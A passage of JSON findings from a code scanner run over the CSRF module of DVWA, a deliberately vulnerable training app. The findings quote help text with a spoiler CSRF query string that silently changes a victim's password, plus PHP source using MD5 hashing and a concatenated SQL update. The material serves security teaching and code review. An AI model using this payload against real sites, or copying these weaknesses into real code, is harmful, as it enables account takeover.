        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n\t\t&lt;p&gt;Your task is to make the current user change their own password, without them knowing about their actions, using a CSRF attack.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;There are no measures in place to protect against this attack. This means a link can be crafted to achieve a certain action (in this case, change the current users password).\n",
        "startLocationLine": 21,
        "startLocationColumn": 61,
        "endLocationLine": 21,
        "endLocationColumn": 69
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;There are no measures in place to protect against this attack. This means a link can be crafted to achieve a certain action (in this case, change the current users password).\n\t\t\tThen with some basic social engineering, have the target click the link (or just visit a certain page), to trigger the action.&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?password_new=password&amp;password_conf=password&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n",
        "startLocationLine": 26,
        "startLocationColumn": 170,
        "endLocationLine": 26,
        "endLocationColumn": 178
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;There are no measures in place to protect against this attack. This means a link can be crafted to achieve a certain action (in this case, change the current users password).\n\t\t\tThen with some basic social engineering, have the target click the link (or just visit a certain page), to trigger the action.&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?password_new=password&amp;password_conf=password&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;For the medium level challenge, there is a check to see where the last requested page came from. The developer believes if it matches the current domain,\n",
        "startLocationLine": 28,
        "startLocationColumn": 53,
        "endLocationLine": 28,
        "endLocationColumn": 61
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;There are no measures in place to protect against this attack. This means a link can be crafted to achieve a certain action (in this case, change the current users password).\n\t\t\tThen with some basic social engineering, have the target click the link (or just visit a certain page), to trigger the action.&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?password_new=password&amp;password_conf=password&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;For the medium level challenge, there is a check to see where the last requested page came from. The developer believes if it matches the current domain,\n",
        "startLocationLine": 28,
        "startLocationColumn": 76,
        "endLocationLine": 28,
        "endLocationColumn": 84
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Impossible Level&lt;/h3&gt;\n\t\t&lt;p&gt;In the impossible level, the challenge will extent the high level and asks for the current user&#39;s password. As this cannot be found out (only predicted or brute forced),\n\t\t\tthere is not an attack vector here.&lt;/p&gt;\n\t&lt;/div&gt;&lt;/td&gt;\n\t&lt;/tr&gt;\n\t&lt;/table&gt;\n\n",
        "startLocationLine": 46,
        "startLocationColumn": 104,
        "endLocationLine": 46,
        "endLocationColumn": 112
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/help/help.php",
        "ruleId": "AI016400",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "email",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "email",
        "excerpt": "\t&lt;td&gt;&lt;div id=&quot;code&quot;&gt;\n\t\t&lt;h3&gt;About&lt;/h3&gt;\n\t\t&lt;p&gt;CSRF is an attack that forces an end user to execute unwanted actions on a web application in which they are currently authenticated.\n\t\t\tWith a little help of social engineering (such as sending a link via email/chat), an attacker may force the users of a web application to execute actions of\n\t\t\tthe attacker&#39;s choosing.&lt;/p&gt;\n\n\t\t&lt;p&gt;A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is\n\t\t\tthe administrator account, this can compromise the entire web application.&lt;/p&gt;\n\n",
        "startLocationLine": 10,
        "startLocationColumn": 73,
        "endLocationLine": 10,
        "endLocationColumn": 78
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n\t\t&lt;p&gt;Your task is to make the current user change their own password, without them knowing about their actions, using a CSRF attack.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;There are no measures in place to protect against this attack. This means a link can be crafted to achieve a certain action (in this case, change the current users password).\n",
        "startLocationLine": 21,
        "startLocationColumn": 61,
        "endLocationLine": 21,
        "endLocationColumn": 69
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;There are no measures in place to protect against this attack. This means a link can be crafted to achieve a certain action (in this case, change the current users password).\n\t\t\tThen with some basic social engineering, have the target click the link (or just visit a certain page), to trigger the action.&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?password_new=password&amp;password_conf=password&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n",
        "startLocationLine": 26,
        "startLocationColumn": 170,
        "endLocationLine": 26,
        "endLocationColumn": 178
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;There are no measures in place to protect against this attack. This means a link can be crafted to achieve a certain action (in this case, change the current users password).\n\t\t\tThen with some basic social engineering, have the target click the link (or just visit a certain page), to trigger the action.&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?password_new=password&amp;password_conf=password&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;For the medium level challenge, there is a check to see where the last requested page came from. The developer believes if it matches the current domain,\n",
        "startLocationLine": 28,
        "startLocationColumn": 53,
        "endLocationLine": 28,
        "endLocationColumn": 61
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;There are no measures in place to protect against this attack. This means a link can be crafted to achieve a certain action (in this case, change the current users password).\n\t\t\tThen with some basic social engineering, have the target click the link (or just visit a certain page), to trigger the action.&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?password_new=password&amp;password_conf=password&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;For the medium level challenge, there is a check to see where the last requested page came from. The developer believes if it matches the current domain,\n",
        "startLocationLine": 28,
        "startLocationColumn": 76,
        "endLocationLine": 28,
        "endLocationColumn": 84
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/help/help.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Impossible Level&lt;/h3&gt;\n\t\t&lt;p&gt;In the impossible level, the challenge will extent the high level and asks for the current user&#39;s password. As this cannot be found out (only predicted or brute forced),\n\t\t\tthere is not an attack vector here.&lt;/p&gt;\n\t&lt;/div&gt;&lt;/td&gt;\n\t&lt;/tr&gt;\n\t&lt;/table&gt;\n\n",
        "startLocationLine": 46,
        "startLocationColumn": 104,
        "endLocationLine": 46,
        "endLocationColumn": 112
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/high.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update the database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 18,
        "startLocationColumn": 33,
        "endLocationLine": 18,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/high.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Password",
        "excerpt": "\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n\telse {\n\t\t// Issue with passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 22,
        "startLocationColumn": 18,
        "endLocationLine": 22,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/high.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Passwords",
        "excerpt": "\t}\n\telse {\n\t\t// Issue with passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n\n",
        "startLocationLine": 26,
        "startLocationColumn": 18,
        "endLocationLine": 26,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/high.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update the database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 18,
        "startLocationColumn": 33,
        "endLocationLine": 18,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/high.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Password",
        "excerpt": "\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n\telse {\n\t\t// Issue with passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 22,
        "startLocationColumn": 18,
        "endLocationLine": 22,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/high.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update the database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 18,
        "startLocationColumn": 13,
        "endLocationLine": 18,
        "endLocationColumn": 100
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/high.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\tif( $pass_new == $pass_conf ) {\n\t\t// They do!\n\t\t$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update the database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 15,
        "startLocationColumn": 15,
        "endLocationLine": 15,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t$pass_curr = md5( $pass_curr );\n\n\t// Check that the current password is correct\n\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\n\t// Do both new passwords match and does the current password match the user?\n",
        "startLocationLine": 18,
        "startLocationColumn": 32,
        "endLocationLine": 18,
        "endLocationColumn": 40
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t$pass_curr = md5( $pass_curr );\n\n\t// Check that the current password is correct\n\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\n\t// Do both new passwords match and does the current password match the user?\n",
        "startLocationLine": 18,
        "startLocationColumn": 77,
        "endLocationLine": 18,
        "endLocationColumn": 85
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t$pass_curr = md5( $pass_curr );\n\n\t// Check that the current password is correct\n\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\n\t// Do both new passwords match and does the current password match the user?\n",
        "startLocationLine": 18,
        "startLocationColumn": 90,
        "endLocationLine": 18,
        "endLocationColumn": 98
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t// Check that the current password is correct\n\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\n\t// Do both new passwords match and does the current password match the user?\n\tif( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {\n\t\t// It does!\n",
        "startLocationLine": 20,
        "startLocationColumn": 22,
        "endLocationLine": 20,
        "endLocationColumn": 30
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database with new password\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Feedback for the user\n",
        "startLocationLine": 31,
        "startLocationColumn": 43,
        "endLocationLine": 31,
        "endLocationColumn": 51
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database with new password\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Feedback for the user\n",
        "startLocationLine": 31,
        "startLocationColumn": 56,
        "endLocationLine": 31,
        "endLocationColumn": 64
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\n\t\t// Update database with new password\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Feedback for the user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n",
        "startLocationLine": 32,
        "startLocationColumn": 23,
        "endLocationLine": 32,
        "endLocationColumn": 31
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI040100",
